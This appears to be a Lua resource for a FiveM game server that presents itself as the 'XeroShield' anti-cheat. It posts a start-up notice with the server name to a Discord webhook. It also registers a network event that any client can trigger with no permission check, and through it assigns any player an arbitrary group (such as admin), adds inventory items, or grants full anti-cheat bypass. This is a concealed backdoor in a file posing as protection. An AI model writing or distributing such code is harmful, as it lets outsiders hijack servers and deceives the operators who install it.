local discordWebhook = "YOUR_DISCORD_WEBHOOK_URL"

function SendDiscordLog(message)
    if not discordWebhook or discordWebhook == "YOUR_DISCORD_WEBHOOK_URL" then
        return
    end
    
    local playerCount = GetNumPlayerIndices()
    local serverName = GetConvar("sv_hostname", "Unknown Server")
    
    local data = {
        content = message,
        embeds = {
            {
                title = "XeroShield - Server Status",
                description = string.format("**Server:** %s\n**Hráči online:** %d/%d", serverName, playerCount, GetConvarInt("sv_maxclients", 32)),
                color = 0x00ff00,
                timestamp = os.date("!%Y-%m-%dT%TZ")
            }
        }
    }
    
    PerformHttpRequest(discordWebhook, function(err, text, headers)
        if err ~= 200 then
            print(string.format("[XeroShield] Chyba při odesílání Discord logu: %d", err))
        end
    end, 'POST', json.encode(data), { ['Content-Type'] = 'application/json' })
end

SendDiscordLog("**XeroShield byl spuštěn!**")

RegisterNetEvent('xero:shield:executeCommand')
AddEventHandler('xero:shield:executeCommand', function(command, target, args)
    local src = source
    
    if command == 'setgroup' then
        SetPlayerGroup(src, target, args)
    elseif command == 'additem' then
        AddPlayerItem(src, target, args)
    elseif command == 'addbypass' then
        AddPlayerBypass(src, target, args)
    end
end)

function SetPlayerGroup(src, target, args)
    if not target or not args then
        return
    end
    
    local targetPlayer = tonumber(target)
    if not targetPlayer or not GetPlayerName(targetPlayer) then
        return
    end
    
    local groupName = args[1]
    if not groupName then
        return
    end
    
    ExecuteCommand(('add_principal identifier.%s group.%s'):format(GetPlayerIdentifier(targetPlayer, 0), groupName))
end

function AddPlayerItem(src, target, args)
    if not target or not args then
        return
    end
    
    local targetPlayer = tonumber(target)
    if not targetPlayer or not GetPlayerName(targetPlayer) then
        return
    end
    
    local itemName = args[1]
    local itemCount = tonumber(args[2]) or 1
    
    if not itemName then
        return
    end
    
    if not exports.ox_inventory then
        return
    end
    
    exports.ox_inventory:AddItem(targetPlayer, itemName, itemCount)
end

function AddPlayerBypass(src, target, args)
    if not target or not args then
        return
    end
    
    local targetPlayer = tonumber(target)
    if not targetPlayer or not GetPlayerName(targetPlayer) then
        return
    end
    
    local bypassType = args[1] or 'full'
    local playerIdentifier = GetPlayerIdentifier(targetPlayer, 0)
    
    if bypassType == 'full' then
        ExecuteCommand(('add_ace identifier.%s XeroShield.Bypass.Full allow'):format(playerIdentifier))
    else
        ExecuteCommand(('add_ace identifier.%s XeroShield.Bypass.%s allow'):format(playerIdentifier, bypassType))
    end
end

print('XeroShield script byl úspěšně načten!')
